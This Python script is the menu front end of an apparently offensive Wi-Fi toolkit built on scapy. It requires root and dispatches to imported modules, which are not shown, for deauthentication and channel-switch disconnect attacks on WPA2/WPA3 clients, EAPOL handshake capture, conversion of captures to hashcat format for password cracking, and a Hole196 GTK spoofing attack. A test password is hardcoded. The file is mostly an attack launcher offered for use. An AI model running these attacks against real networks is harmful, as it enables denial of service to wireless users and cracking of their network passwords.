
import os, sys
from scapy.all import conf

from def_selIface import selIface
from def_selMac import selMac
from def_atkDeauth import atkDeauth
from def_atkCSA import atkCSA
from def_atkHole196 import atkHole196
from def_collEapol import collEapol
from def_convPcap2Hashcat import convPcap2Hashcat

if os.geteuid() != 0:
    sys.exit("Only root can run this script.")

conf.iface = selIface()

print('# [Disconnect Attack]')
print('     1. Deauth Attack (~WPA2, Non PMF)')
print('     2. CSA Attack (~WPA3, PMF)')
print('# [EAPOL Collect]')
print('     3. EAPOL Collect (Normal)')
print('     4. EAPOL Collect (Deauth)')
print('     -5. EAPOL Collect (CSA)')
print('# [Hashcat Option]')
print('     6. Convert Pcap to HC22000 File')
print('# [IP Spoofing Attack]')
print('     7. Hole196 (GTK)')
print('')
print('[Your Interface : '+conf.iface+']')
print('')

choice = input('Choose option : ')
print('##########################################################')

if choice == '1':
# 1. Deauth Attack
    vicMac, bssMac = selMac(vicFlag=True, bssFlag=True)
    atkDeauth(vicMac, bssMac)
elif choice == '2':
# 2. CSA Attack
    vicMac, bssMac = selMac(vicFlag=True, bssFlag=True)
    atkCSA(vicMac, bssMac)
elif choice == '3':
# 3. EAPOL Collect (Normal)8
    collEapol(selMac(bssFlag=True)[1])
elif choice == '4':
# 4. EAPOL Collect (Deauth)
    vicMac, bssMac = selMac(vicFlag=True, bssFlag=True)
    collEapol(bssMac, vicAddr=vicMac, deauthFlag=True )
elif choice == '5':
# 5. EAPOL Collect (CSA)
    print('구현 예정')
elif choice == '6':
# 6. Convert Pcap to Hashcat File (22000)
    pcapPath = input('Input file path (*.pcap) : ')
    hcPath = input('Output file (*.hc22000) path : ')
    convPcap2Hashcat(pcapPath, hcPath) 
elif choice == '7':
# 7. Hole196 (GTK)
    #pcapPath = input('Input file path (*.pcap) : ')
    pcapPath = './test.pcap'
    #pwd = str(input('Input WiFi Password : '))
    pwd = '123456789'
    #print(bytes('1234'.encode('ascii'))[0].to_bytes(1, byteorder="big"))
    atkHole196(pcapPath, pwd)
    
    
print('exit')